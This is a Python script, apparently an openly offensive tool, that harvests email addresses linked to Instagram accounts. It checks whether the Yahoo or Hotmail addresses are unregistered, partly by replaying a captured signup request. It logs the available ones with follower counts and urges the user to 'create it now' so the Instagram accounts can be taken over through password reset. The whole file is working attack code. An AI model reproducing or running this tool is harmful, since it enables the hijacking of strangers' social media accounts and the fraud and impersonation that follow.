import requests
import time
from bs4 import BeautifulSoup
import re

print("[+] Insta Fucker v.1")
print("[+] Coded By: Mostafa M. Mead\n")

def get_followers_and_following_count(username):
    url = "https://instagram.com/{}/".format(username)
    req = requests.get(url)
    source = req.text
    data = re.search(r'erty="og:description" content="(.*?)"' , source)
    return data.group(1).split('-')[0]

def is_email(email):
    pattern = r'^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$'
    if re.search(pattern, email):
        return True
    else:
        return False

def check_hotmail(email):
    url = 'https://login.live.com/?username={}'.format(email)
    req = requests.get(url)
    src = req.text
    if '"IfExistsResult":1' in src:
        return True
    else:
        return False

def check_yahoo(email):
    email = email.split("@")[0]
    url = 'https://login.yahoo.com/account/module/create?validateField=yid'
    headers = {
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'en-US,en;q=0.9',
        'Content-Length':'1315',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie':'B=0tbc34tei1pqh&b=3&s=lp; AS=v=1&s=989eBxSX',
        'Host':'login.yahoo.com',
        'Origin':'https://login.yahoo.com',
        "Referer":'https://login.yahoo.com/account/create?specId=yidReg',
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
        'X-Requested-With':'XMLHttpRequest'
    }
    data = "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1.25%2C%22hardwareConcurrency%22%3A8%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Africa%2FCairo%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A3%2C%22hash%22%3A%22e43a8bc708fc490225cde0663b28278c%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.~Google%20SwiftShader%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.0434474653739%22%2C%22resolution%22%3A%7B%22w%22%3A%221536%22%2C%22h%22%3A%22864%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22824%22%2C%22h%22%3A%221536%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1565700119760%2C%22render%22%3A1565700121297%7D%7D&specId=yidReg&cacheStored=true&crumb=t.RN.7d4aNk&acrumb=989eBxSX&sessionIndex=&done=https%3A%2F%2Fwww.yahoo.com&googleIdToken=&authCode=&attrSetIndex=0&tos0=oath_freereg%7Cxa%7Cen-JO&firstName=mostafa&lastName=mead&yid={}&password=sasa123456&mm=&dd=&yyyy=".format(email)
    req = requests.post(url , data=data , headers=headers , timeout=10)
    src = req.text
    if 'IDENTIFIER_EXISTS' in src or 'IDENTIFIER_NOT_AVAILABLE' in src or 'SOME_SPECIAL_CHARACTERS_NOT_ALLOWED' in src or 'short' in src.lower():
        return False
    else:
        return src

def get_emails(keyword):
    emails = []
    url = "https://codeofaninja.com/tools/find-instagram-id-answer.php?instagram_username={}".format(keyword)
    req = requests.get(url)
    source = req.text
    soup = BeautifulSoup(source , 'html.parser')
    a_tags = soup.find_all("a")
    for a in a_tags:
        if is_email(a.text):
            emails.append("{}|Seperator|{}|Seperator|{}".format(a.text , a['href'], str(a['href'].split('/')[3])))
    return list(set(emails))

def check(item):
    email, link, username = item.split("|Seperator|")
    if '-' in email or '*' in email:
        return
    if 'yahoo' in email:
        if check_yahoo(email):
            insta_text = open("insta_availiables.txt" , "a+")
            insta_text.write("{}|{}|{}\n".format(email, link, get_followers_and_following_count(username)))
            insta_text.close()
            print("[+] Oh {} is availiable, create it now".format(email))
            print("[+] Link: {}".format(link))
        else:
            print("[-] Sorry {} is not availiable".format(email))
    elif 'hotmail' in email:
        if check_hotmail(email):
            insta_text = open("insta_availiables.txt" , "a+")
            insta_text.write("{}|{}|{}\n".format(email, link, get_followers_and_following_count(username)))
            insta_text.close()
            print("[+] Oh {} is availiable, create it now".format(email))
            print("[+] Link: {}".format(link))
        else:
            print("[-] Sorry {} is not availiable".format(email))

def main():
    keywords_text = input("[+] Enter Your Keywords Text: ")
    with open(keywords_text) as f:
        lines = f.read().split('\n')
    for line in lines:
        if line is not '' and line is not None:
            emails = get_emails(line)
            for email in emails:
                try:
                    check(email)
                except:
                    pass

if __name__ == "__main__":
    main()
    input("[+] Completed")